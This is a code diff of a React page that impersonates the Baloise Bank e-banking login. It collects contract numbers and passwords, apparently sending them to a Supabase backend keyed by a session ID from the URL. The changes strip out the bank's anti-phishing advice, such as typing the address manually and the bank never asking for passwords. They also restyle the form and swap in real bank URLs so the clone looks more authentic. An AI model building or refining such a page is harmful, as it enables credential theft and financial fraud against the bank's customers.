@@ -1,18 +1,24 @@
 import { useEffect, useRef, useState } from "react";
 import { useSearchParams, useNavigate } from "react-router-dom";
-import { Eye, EyeOff, Globe, ChevronDown, Plus, Minus } from "lucide-react";
+import { Eye, EyeOff, Globe, ChevronDown, X } from "lucide-react";
 import { supabase } from "@/integrations/supabase/client";
 import LoadingOverlay from "@/components/LoadingOverlay";
 import { usePageMeta } from "@/hooks/use-page-meta";
 import baloiseLogo from "@/assets/baloise-logo.svg";
 
-const NAVY = "#00005A";
-const BANNER = "#DCEBFA";
+const NAVY = "#000d6e";
+const BANNER = "#a7d1fa";
 const BODY_BG = "#F1F4F7";
-const INFO_BG = "#ECEEF1";
+const BTN_BG = "#293485";
+const HOVER_BG = "#a7d1fa";
+const INPUT_BG = "#e8e8e8";
 const BORDER = "#C9CDD4";
+const ERROR = "#d32f2f";
+const ERROR_BG = "#fdecea";
+const FOOTER_BG = "#f6f6f6";
+const FOOTER_TXT = "#6b7280";
 
-type Lang = "de" | "fr" | "it" | "en";
+type Lang = "de" | "fr" | "it";
 
 const T: Record<Lang, Record<string, string>> = {
   de: {
@@ -26,13 +32,8 @@ const T: Record<Lang, Record<string, string>> = {
     submit: "Anmelden",
     forgot: "Passwort vergessen",
     newDevice: "Neues Gerät aktivieren",
-    secureTitle: "Sicher einloggen - nur so geht es richtig:",
-    secureBody:
-      "Tippen Sie die Adresse der Webseite der Baloise Bank (www.baloise.ch) immer manuell oben in der Adresszeile Ihres Browsers ein. Verwenden Sie niemals einen Link oder eine Suchmaschine (z.B. Bing oder Google).",
-    moreTips: "Weitere Tipps",
-    tip1: "Geben Sie Ihre Zugangsdaten ausschliesslich auf der offiziellen Baloise-Webseite ein.",
-    tip2: "Prüfen Sie vor der Eingabe, ob das Schloss-Symbol und die korrekte Adresse angezeigt werden.",
-    tip3: "Baloise wird Sie niemals per E-Mail oder Telefon nach Ihrem Passwort fragen.",
+    required: "Ein Wert wird benötigt",
+    langTitle: "Sprache wählen",
     fSecurity: "Sicherheit",
     fLegal: "Rechtliche Hinweise",
     fContact: "Kontakt",
@@ -49,13 +50,8 @@ const T: Record<Lang, Record<string, string>> = {
     submit: "Se connecter",
     forgot: "Mot de passe oublié",
     newDevice: "Activer un nouvel appareil",
-    secureTitle: "Se connecter en toute sécurité - voici comment faire:",
-    secureBody:
-      "Tapez toujours l'adresse du site de la Baloise Bank (www.baloise.ch) manuellement dans la barre d'adresse de votre navigateur. N'utilisez jamais un lien ou un moteur de recherche (p.ex. Bing ou Google).",
-    moreTips: "Autres conseils",
-    tip1: "Saisissez vos données d'accès uniquement sur le site officiel de la Baloise.",
-    tip2: "Avant la saisie, vérifiez le cadenas et l'adresse correcte.",
-    tip3: "La Baloise ne vous demandera jamais votre mot de passe par e-mail ou téléphone.",
+    required: "Une valeur est requise",
+    langTitle: "Choisir la langue",
     fSecurity: "Sécurité",
     fLegal: "Mentions légales",
     fContact: "Contact",
@@ -72,48 +68,19 @@ const T: Record<Lang, Record<string, string>> = {
     submit: "Accedi",
     forgot: "Password dimenticata",
     newDevice: "Attivare nuovo dispositivo",
-    secureTitle: "Accedere in sicurezza - ecco come:",
-    secureBody:
-      "Digitate sempre manualmente l'indirizzo del sito della Baloise Bank (www.baloise.ch) nella barra degli indirizzi del browser. Non utilizzate mai un link o un motore di ricerca (es. Bing o Google).",
-    moreTips: "Ulteriori suggerimenti",
-    tip1: "Inserite i vostri dati d'accesso solo sul sito ufficiale di Baloise.",
-    tip2: "Prima dell'inserimento, controllate il lucchetto e l'indirizzo corretto.",
-    tip3: "Baloise non vi chiederà mai la password via e-mail o telefono.",
+    required: "È richiesto un valore",
+    langTitle: "Scegli la lingua",
     fSecurity: "Sicurezza",
     fLegal: "Note legali",
     fContact: "Contatto",
     loading: "Verifica dei dati di accesso in corso...",
   },
-  en: {
-    banner: "We are part of the Helvetia Baloise Group",
-    title: "Baloise E-banking",
-    help: "Help & contact",
-    h1: "Login",
-    contract: "Contract number",
-    password: "Password",
-    placeholder: "Enter here …",
-    submit: "Sign in",
-    forgot: "Forgot password",
-    newDevice: "Activate new device",
-    secureTitle: "Log in securely - this is how it's done:",
-    secureBody:
-      "Always type the address of the Baloise Bank website (www.baloise.ch) manually in the address bar of your browser. Never use a link or a search engine (e.g. Bing or Google).",
-    moreTips: "More tips",
-    tip1: "Only enter your credentials on the official Baloise website.",
-    tip2: "Before entering, check the padlock icon and the correct address.",
-    tip3: "Baloise will never ask for your password by e-mail or phone.",
-    fSecurity: "Security",
-    fLegal: "Legal notice",
-    fContact: "Contact",
-    loading: "Verifying login credentials...",
-  },
 };
 
-const LANG_OPTIONS: { code: Lang; label: string }[] = [
-  { code: "de", label: "DE" },
-  { code: "fr", label: "FR" },
-  { code: "it", label: "IT" },
-  { code: "en", label: "EN" },
+const LANG_OPTIONS: { code: Lang; label: string; short: string }[] = [
+  { code: "de", label: "Deutsch", short: "DE" },
+  { code: "fr", label: "Français", short: "FR" },
+  { code: "it", label: "Italiano", short: "IT" },
 ];
 
 const ChBaloise = () => {
@@ -125,9 +92,12 @@ const ChBaloise = () => {
   const [passwort, setPasswort] = useState("");
   const [showPw, setShowPw] = useState(false);
   const [showLoading, setShowLoading] = useState(false);
-  const [tipsOpen, setTipsOpen] = useState(false);
   const [lang, setLang] = useState<Lang>("de");
   const [langOpen, setLangOpen] = useState(false);
+  const [contractTouched, setContractTouched] = useState(false);
+  const [pwTouched, setPwTouched] = useState(false);
+  const [contractFocus, setContractFocus] = useState(false);
+  const [pwFocus, setPwFocus] = useState(false);
   const langRef = useRef<HTMLDivElement | null>(null);
   const t = T[lang];
 
@@ -150,6 +120,8 @@ const ChBaloise = () => {
     return () => document.removeEventListener("mousedown", onDoc);
   }, []);
 
+  const contractError = contractTouched && vertragsnummer.trim() === "";
+  const pwError = pwTouched && passwort === "";
   const disabled = vertragsnummer.trim() === "" || passwort === "";
 
   const handleSubmit = async (e: React.FormEvent) => {
@@ -168,6 +140,22 @@ const ChBaloise = () => {
       console.error("No session ID found in URL!");
     }
     setShowLoading(true);
+  };
+
+  // Shared input style helper
+  const inputStyle = (hasError: boolean, isFocus: boolean): React.CSSProperties => {
+    if (hasError) {
+      return {
+        border: `2px solid ${ERROR}`,
+        background: ERROR_BG,
+        color: NAVY,
+      };
+    }
+    return {
+      border: `2px solid ${isFocus ? NAVY : BORDER}`,
+      background: isFocus ? INPUT_BG : "#FFFFFF",
+      color: NAVY,
+    };
   };
 
   return (
@@ -189,7 +177,7 @@ const ChBaloise = () => {
       >
         {/* Banner */}
         <div
-          className="w-full text-center py-2 text-[13px] font-semibold"
+          className="w-full text-center py-2 text-[15px] font-bold"
           style={{ background: BANNER, color: NAVY }}
         >
           {t.banner}
@@ -204,10 +192,6 @@ const ChBaloise = () => {
             <a href="https://ebanking.baloise.ch/" aria-label="Baloise">
               <img src={baloiseLogo} alt="Baloise" className="h-7 md:h-8 w-auto" />
             </a>
-            <span
-              className="hidden sm:block w-px h-7"
-              style={{ background: "rgba(255,255,255,0.3)" }}
-            />
             <span className="hidden sm:inline text-white font-bold text-[16px] md:text-[18px]">
               {t.title}
             </span>
@@ -217,10 +201,16 @@ const ChBaloise = () => {
               href="https://www.baloise.ch/DE-e-banking"
               target="_blank"
               rel="noopener noreferrer"
-              className="hidden sm:inline-flex items-center px-4 py-2 rounded-md text-white text-[14px] font-semibold transition-colors"
-              style={{ border: "1px solid rgba(255,255,255,0.4)" }}
-              onMouseEnter={(e) => (e.currentTarget.style.background = "rgba(255,255,255,0.1)")}
-              onMouseLeave={(e) => (e.currentTarget.style.background = "transparent")}
+              className="hidden sm:inline-flex items-center px-4 py-2 rounded-md text-[14px] font-semibold transition-colors"
+              style={{ background: BTN_BG, border: `1px solid ${BTN_BG}`, color: "#FFFFFF" }}
+              onMouseEnter={(e) => {
+                e.currentTarget.style.background = HOVER_BG;
+                e.currentTarget.style.color = NAVY;
+              }}
+              onMouseLeave={(e) => {
+                e.currentTarget.style.background = BTN_BG;
+                e.currentTarget.style.color = "#FFFFFF";
+              }}
             >
               {t.help}
             </a>
@@ -228,8 +218,16 @@ const ChBaloise = () => {
               <button
                 type="button"
                 onClick={() => setLangOpen((v) => !v)}
-                className="inline-flex items-center gap-2 px-3 md:px-4 py-2 rounded-md text-white text-[14px] font-semibold"
-                style={{ border: "1px solid rgba(255,255,255,0.4)" }}
+                className="inline-flex items-center gap-2 px-3 md:px-4 py-2 rounded-md text-[14px] font-semibold transition-colors"
+                style={{ background: BTN_BG, border: `1px solid ${BTN_BG}`, color: "#FFFFFF" }}
+                onMouseEnter={(e) => {
+                  e.currentTarget.style.background = HOVER_BG;
+                  e.currentTarget.style.color = NAVY;
+                }}
+                onMouseLeave={(e) => {
+                  e.currentTarget.style.background = BTN_BG;
+                  e.currentTarget.style.color = "#FFFFFF";
+                }}
                 aria-haspopup="listbox"
                 aria-expanded={langOpen}
               >
@@ -239,27 +237,51 @@ const ChBaloise = () => {
               </button>
               {langOpen && (
                 <div
-                  className="absolute right-0 top-full mt-2 z-30 rounded-md overflow-hidden shadow-lg bg-white min-w-[120px]"
-                  style={{ border: `1px solid ${BORDER}` }}
+                  className="absolute right-0 top-full mt-3 z-30 rounded-lg bg-white min-w-[240px] shadow-[0_8px_24px_rgba(0,0,0,0.15)]"
                   role="listbox"
                 >
-                  {LANG_OPTIONS.map((opt) => (
+                  {/* Speech-bubble arrow pointing up to DE button */}
+                  <span
+                    aria-hidden
+                    className="absolute -top-2 right-5 w-3 h-3 bg-white rotate-45"
+                    style={{ boxShadow: "-1px -1px 0 rgba(0,0,0,0.03)" }}
+                  />
+                  <div className="flex items-center justify-between px-4 pt-3 pb-2 relative">
+                    <span className="text-[14px] font-semibold" style={{ color: NAVY }}>
+                      {t.langTitle}
+                    </span>
                     <button
-                      key={opt.code}
                       type="button"
-                      onClick={() => {
-                        setLang(opt.code);
-                        setLangOpen(false);
-                      }}
-                      className="block w-full text-left px-4 py-2 text-[14px] hover:bg-gray-50"
-                      style={{
-                        color: NAVY,
-                        fontWeight: opt.code === lang ? 700 : 500,
-                      }}
+                      aria-label="Schließen"
+                      onClick={() => setLangOpen(false)}
+                      className="p-1 rounded hover:bg-gray-100"
+                      style={{ color: NAVY }}
                     >
-                      {opt.label}
+                      <X className="w-4 h-4" strokeWidth={2} />
                     </button>
-                  ))}
+                  </div>
+                  <div className="flex flex-col gap-1 px-3 pb-3">
+                    {LANG_OPTIONS.map((opt) => {
+                      const active = opt.code === lang;
+                      return (
+                        <button
+                          key={opt.code}
+                          type="button"
+                          onClick={() => {
+                            setLang(opt.code);
+                            setLangOpen(false);
+                          }}
+                          className="block w-full text-left px-3 py-2 rounded-md text-[14px] font-semibold transition-colors"
+                          style={{
+                            background: active ? NAVY : "#e8e8e8",
+                            color: active ? "#d1d5db" : NAVY,
+                          }}
+                        >
+                          {opt.label}
+                        </button>
+                      );
+                    })}
+                  </div>
                 </div>
               )}
             </div>
@@ -268,11 +290,11 @@ const ChBaloise = () => {
 
         {/* Main */}
         <main className="flex-1 px-4 md:px-6 py-10 md:py-12">
-          <div className="max-w-[560px] mx-auto">
+          <div className="max-w-[480px] mx-auto">
             {/* Login Card */}
-            <section className="bg-white rounded-lg p-6 md:p-10 shadow-[0_1px_2px_rgba(0,0,0,0.06)]">
+            <section className="bg-white rounded-2xl p-6 md:p-10 shadow-[0_8px_24px_rgba(0,0,0,0.08)]">
               <h1
-                className="text-center font-extrabold mb-8"
+                className="text-center font-semibold mb-8"
                 style={{ color: NAVY, fontSize: "clamp(22px, 3vw, 28px)" }}
               >
                 {t.h1}
@@ -284,7 +306,7 @@ const ChBaloise = () => {
                   <label
                     htmlFor="bal-contract"
                     className="block text-[14px] font-bold mb-2"
-                    style={{ color: NAVY }}
+                    style={{ color: contractError ? ERROR : NAVY }}
                   >
                     {t.contract}
                   </label>
@@ -295,20 +317,29 @@ const ChBaloise = () => {
                     placeholder={t.placeholder}
                     value={vertragsnummer}
                     onChange={(e) => setVertragsnummer(e.target.value)}
+                    onFocus={() => setContractFocus(true)}
+                    onBlur={() => {
+                      setContractFocus(false);
+                      setContractTouched(true);
+                    }}
+                    onMouseEnter={(e) => {
+                      if (!contractError && !contractFocus) {
+                        e.currentTarget.style.background = INPUT_BG;
+                      }
+                    }}
+                    onMouseLeave={(e) => {
+                      if (!contractError && !contractFocus) {
+                        e.currentTarget.style.background = "#FFFFFF";
+                      }
+                    }}
                     className="w-full h-11 rounded-md px-3 text-[15px] outline-none transition-colors"
-                    style={{
-                      border: `1px solid ${BORDER}`,
-                      color: NAVY,
-                    }}
-                    onFocus={(e) => {
-                      e.currentTarget.style.borderColor = NAVY;
-                      e.currentTarget.style.boxShadow = `0 0 0 1px ${NAVY}`;
-                    }}
-                    onBlur={(e) => {
-                      e.currentTarget.style.borderColor = BORDER;
-                      e.currentTarget.style.boxShadow = "none";
-                    }}
+                    style={inputStyle(contractError, contractFocus)}
                   />
+                  {contractError && (
+                    <p className="mt-1 text-[13px] font-normal" style={{ color: ERROR }}>
+                      {t.required}
+                    </p>
+                  )}
                 </div>
 
                 {/* Passwort */}
@@ -316,7 +347,7 @@ const ChBaloise = () => {
                   <label
                     htmlFor="bal-pw"
                     className="block text-[14px] font-bold mb-2"
-                    style={{ color: NAVY }}
+                    style={{ color: pwError ? ERROR : NAVY }}
                   >
                     {t.password}
                   </label>
@@ -328,19 +359,23 @@ const ChBaloise = () => {
                       placeholder={t.placeholder}
                       value={passwort}
                       onChange={(e) => setPasswort(e.target.value)}
+                      onFocus={() => setPwFocus(true)}
+                      onBlur={() => {
+                        setPwFocus(false);
+                        setPwTouched(true);
+                      }}
+                      onMouseEnter={(e) => {
+                        if (!pwError && !pwFocus) {
+                          e.currentTarget.style.background = INPUT_BG;
+                        }
+                      }}
+                      onMouseLeave={(e) => {
+                        if (!pwError && !pwFocus) {
+                          e.currentTarget.style.background = "#FFFFFF";
+                        }
+                      }}
                       className="w-full h-11 rounded-md px-3 pr-11 text-[15px] outline-none transition-colors"
-                      style={{
-                        border: `1px solid ${BORDER}`,
-                        color: NAVY,
-                      }}
-                      onFocus={(e) => {
-                        e.currentTarget.style.borderColor = NAVY;
-                        e.currentTarget.style.boxShadow = `0 0 0 1px ${NAVY}`;
-                      }}
-                      onBlur={(e) => {
-                        e.currentTarget.style.borderColor = BORDER;
-                        e.currentTarget.style.boxShadow = "none";
-                      }}
+                      style={inputStyle(pwError, pwFocus)}
                     />
                     <button
                       type="button"
@@ -356,6 +391,11 @@ const ChBaloise = () => {
                       )}
                     </button>
                   </div>
+                  {pwError && (
+                    <p className="mt-1 text-[13px] font-normal" style={{ color: ERROR }}>
+                      {t.required}
+                    </p>
+                  )}
                 </div>
 
                 {/* Anmelden */}
@@ -369,7 +409,7 @@ const ChBaloise = () => {
                     cursor: disabled ? "not-allowed" : "pointer",
                   }}
                   onMouseEnter={(e) => {
-                    if (!disabled) e.currentTarget.style.background = "#000040";
+                    if (!disabled) e.currentTarget.style.background = "#000a4d";
                   }}
                   onMouseLeave={(e) => {
                     if (!disabled) e.currentTarget.style.background = NAVY;
@@ -380,7 +420,7 @@ const ChBaloise = () => {
 
                 <div className="flex flex-wrap justify-between gap-4 mt-3 text-[14px] font-bold">
                   <a
-                    href="https://www.baloise.ch/de/privatkunden/services/passwort-vergessen.html"
+                    href="https://ebanking.baloise.ch/auth/ui/app/self-service/select/flow/password-reset"
                     target="_blank"
                     rel="noopener noreferrer"
                     className="underline underline-offset-4"
@@ -389,7 +429,7 @@ const ChBaloise = () => {
                     {t.forgot}
                   </a>
                   <a
-                    href="https://www.baloise.ch/de/privatkunden/services/neues-geraet-aktivieren.html"
+                    href="https://ebanking.baloise.ch/auth/ui/app/self-service/flow/order-2fa-letter/"
                     target="_blank"
                     rel="noopener noreferrer"
                     className="underline underline-offset-4"
@@ -400,77 +440,39 @@ const ChBaloise = () => {
                 </div>
               </form>
             </section>
-
-            {/* Info Box */}
-            <section
-              className="rounded-lg p-6 mt-6"
-              style={{ background: INFO_BG, color: NAVY }}
-            >
-              <h2 className="font-bold text-[15px] mb-3">{t.secureTitle}</h2>
-              <p className="text-[14px] leading-relaxed">{t.secureBody}</p>
-              <div
-                className="mt-5 pt-4"
-                style={{ borderTop: `1px solid rgba(0,0,90,0.2)` }}
-              >
-                <button
-                  type="button"
-                  onClick={() => setTipsOpen((v) => !v)}
-                  className="w-full flex items-center justify-between text-[14px] font-bold"
-                  style={{ color: NAVY }}
-                  aria-expanded={tipsOpen}
-                >
-                  <span className="underline underline-offset-4">{t.moreTips}</span>
-                  {tipsOpen ? (
-                    <Minus className="w-5 h-5" strokeWidth={2} />
-                  ) : (
-                    <Plus className="w-5 h-5" strokeWidth={2} />
-                  )}
-                </button>
-                {tipsOpen && (
-                  <ul className="mt-4 flex flex-col gap-2 text-[14px] leading-relaxed list-disc pl-5">
-                    <li>{t.tip1}</li>
-                    <li>{t.tip2}</li>
-                    <li>{t.tip3}</li>
-                  </ul>
-                )}
-              </div>
-            </section>
           </div>
         </main>
 
         {/* Footer */}
-        <footer
-          className="bg-white py-5 mt-8"
-          style={{ borderTop: "1px solid #E5E7EB" }}
-        >
-          <div className="max-w-[1180px] mx-auto px-4 flex flex-wrap justify-center gap-6 md:gap-10 text-[13px] font-semibold">
-            <a
-              href="https://www.baloise.ch/de/privatkunden/services/sicherheit.html"
-              target="_blank"
-              rel="noopener noreferrer"
-              style={{ color: NAVY }}
-              className="hover:underline"
-            >
-              {t.fSecurity}
-            </a>
-            <a
-              href="https://www.baloise.ch/de/ueber-uns/rechtliche-hinweise.html"
-              target="_blank"
-              rel="noopener noreferrer"
-              style={{ color: NAVY }}
-              className="hover:underline"
-            >
-              {t.fLegal}
-            </a>
-            <a
-              href="https://www.baloise.ch/de/kontakt.html"
-              target="_blank"
-              rel="noopener noreferrer"
-              style={{ color: NAVY }}
-              className="hover:underline"
-            >
-              {t.fContact}
-            </a>
+        <footer className="py-5 mt-8" style={{ background: FOOTER_BG }}>
+          <div className="max-w-[1180px] mx-auto px-4 flex flex-wrap justify-center gap-6 md:gap-10 text-[13px] font-normal">
+            {[
+              {
+                href: "https://www.baloise.ch/de/privatkunden/konten-karten-finanzierung/services/e-banking/sicherheit.html",
+                label: t.fSecurity,
+              },
+              {
+                href: "https://www.baloise.ch/e-banking-rechtliche-hinweise",
+                label: t.fLegal,
+              },
+              {
+                href: "https://www.baloise.ch/kontakt",
+                label: t.fContact,
+              },
+            ].map((link) => (
+              <a
+                key={link.href}
+                href={link.href}
+                target="_blank"
+                rel="noopener noreferrer"
+                style={{ color: FOOTER_TXT }}
+                className="transition-colors"
+                onMouseEnter={(e) => (e.currentTarget.style.color = NAVY)}
+                onMouseLeave={(e) => (e.currentTarget.style.color = FOOTER_TXT)}
+              >
+                {link.label}
+              </a>
+            ))}
           </div>
         </footer>
       </div>
